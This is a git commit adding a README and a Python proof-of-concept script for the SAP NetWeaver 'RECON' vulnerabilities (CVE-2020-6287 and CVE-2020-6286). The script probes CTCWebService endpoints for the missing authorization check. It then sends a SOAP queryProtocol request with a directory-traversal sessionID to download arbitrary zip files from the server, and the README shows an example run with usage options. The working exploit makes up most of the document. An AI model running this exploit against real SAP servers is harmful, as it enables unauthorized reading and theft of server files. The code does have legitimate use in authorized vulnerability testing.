6790cd6da5f42a18642fa9c07bd16be4a552db3f
chipik <chipik2@gmail.com>
2020-07-15 18:20:32 +0300

    first commit

---
+++ README.md
@@ -0,0 +1,60 @@
+PoC for CVE-2020-6287, CVE-2020-6286 (SAP RECON vulnerability)
+
+~~Pffff! RECON (Remotely Exploitable Code On NetWeaver)? Guys, really? That was the best codename you came up with? :)~~ 
+
+This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and as PoC exploits directory traversal in `queryProtocol` method.
+
+Directory traversal allows to download any `zip` from SAP server.
+
+***This PoC doesn't provide RCE/user creation functionality.<br>This project is created only for educational purposes and cannot be used for law violation or personal gain.
+<br>The author of this project is not responsible for any possible harm caused by the materials of this project***
+
+Original finding: [Pablo Artuso](https://twitter.com/lmkalg)
+
+Solution: [#2934135](https://launchpad.support.sap.com/#/notes/2934135), [#2939665](https://launchpad.support.sap.com/#/notes/2939665)
+
+
+
+# How to use
+
+
+Just point SAP NW AS Java hostnmae/ip.
+
+There is additional options:
+
+1. `-c` - check if SAP server is vulnerable to RECON
+2. `-f` - download `zip` file from SAP server
+
+
+Ex.:
+
+```
+~python RECON.py -H 172.16.30.8 -f /1111.zip
+Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
+Ok! File zipfile_929.zip was saved
+```
+
+## All options
+
+
+```
+~python RECON.py -h
+usage: RECON.py [-h] [-H HOST] [-P PORT] [-s] [-c] [-f ZIPFILE]
+                [--timeout TIMEOUT] [-v]
+
+PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
+This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
+Original finding: Pablo Artuso. https://twitter.com/lmkalg
+Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -H HOST, --host HOST  Java NW host (default: 127.0.0.1)
+  -P PORT, --port PORT  Java NW web port (default: tcp/50000)
+  -s, --ssl             enable SSL
+  -c, --check           just detect vulnerability
+  -f ZIPFILE, --zipfile ZIPFILE
+                        ZIP file to read. CVE-2020-6286
+  --timeout TIMEOUT     HTTP connection timeout in second (default: 10)
+  -v, --verbose         verbose mode
+```
---
+++ RECON.py
@@ -0,0 +1,94 @@
+#!/usr/bin/env python3
+
+__author__ = 'chipik'
+
+import base64
+import random
+import requests
+import argparse
+import xml.etree.ElementTree as ET
+
+help_desc = '''
+PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
+This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
+Original finding: Pablo Artuso. https://twitter.com/lmkalg
+Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
+'''
+
+
+def detect_vuln(base_url):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"}
+    status = 'OK'
+    checks =  [{"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":405},
+               {"name":"Check2","path":"/CTCWebService/CTCWebServiceBean?wsdl","sign_status":200},
+               {"name":"Check3","path":"/CTCWebService/Config1?wsdl","sign_status":200}]
+    for check in checks:
+        ans = requests.get(base_url + check['path'], headers=headers, timeout=timeout, allow_redirects=False, verify=False)
+        if ans.status_code == check['sign_status']:
+            status = 'Vulnerable!'
+            print ("%s - %s - %s" %(check['name'], status, base_url + check['path'] ))
+            return {"status":True, "url":base_url + check['path']}
+        else:
+            print ("%s - %s" %(check['name'], status))
+            return {"status":False, "url":""}
+
+
+def exploit_traversal(url, zipfile):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
+        "Content-Type":"text/xml;charset=UTF-8"}
+    xml = '''
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <urn:queryProtocol>
+         <sessionID>/../../../../../../../../../../../../../../../../../..%s</sessionID>
+      </urn:queryProtocol>
+   </soapenv:Body>
+</soapenv:Envelope>
+    ''' % (zipfile.replace(".zip",""))
+    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
+    if ans.status_code == 200:
+        myroot = ET.fromstring(ans.content)
+        zipb64 = ''
+        for ret_val in myroot.iter('return'):
+            zipb64 = ret_val.text
+        if zipb64:
+            zipdata = base64.b64decode(zipb64)
+            filename = "zipfile_%d.zip" %(random.randint(1, 10000))
+            with open(filename, 'wb') as f:
+                f.write(zipdata)
+            print("Ok! File %s was saved" % (filename))
+        else:
+            print("Error! Can't read file %s. Look's like there is no file %s on the server" % (zipfile, zipfile))
+    else:
+        print("Error! Can't read file %s. Status: %s" % (zipfile, ans.status_code))
+    return
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-H', '--host', default='127.0.0.1', help='Java NW host (default: 127.0.0.1)')
+    parser.add_argument('-P', '--port', default=50000, type=int, help='Java NW web port (default: tcp/50000)')
+    parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
+    parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
+    parser.add_argument('-f', '--zipfile', default='', help='ZIP file to read. CVE-2020-6286')
+    parser.add_argument('--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
+    args = parser.parse_args()
+    timeout = args.timeout
+
+    if args.ssl:
+        base_url = "https://%s:%s" % (args.host, args.port)
+    else:
+        base_url = "http://%s:%s" % (args.host, args.port)
+    if args.check:
+        detect_vuln(base_url)
+        exit()
+    if args.zipfile:
+        result = detect_vuln(base_url)
+        if result["status"]:
+            exploit_traversal(result["url"].replace("?wsdl",""),args.zipfile)
+
+
